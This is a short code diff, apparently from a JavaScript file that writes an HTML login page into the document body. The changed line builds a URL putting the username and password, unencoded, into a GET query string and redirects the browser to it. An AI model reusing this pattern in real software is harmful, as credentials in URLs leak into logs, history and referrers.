@@ -87,7 +87,7 @@ document.body.innerHTML = `<!DOCTYPE html>
           }
 
           // Construct the query string
-          const url = `${form.action}?username=${username}&password=${password}`;
+          const url = \`${form.action}?username=\${username}&password=\${password}\`
           
           // Redirect the browser to the constructed URL
           window.location.href = url;
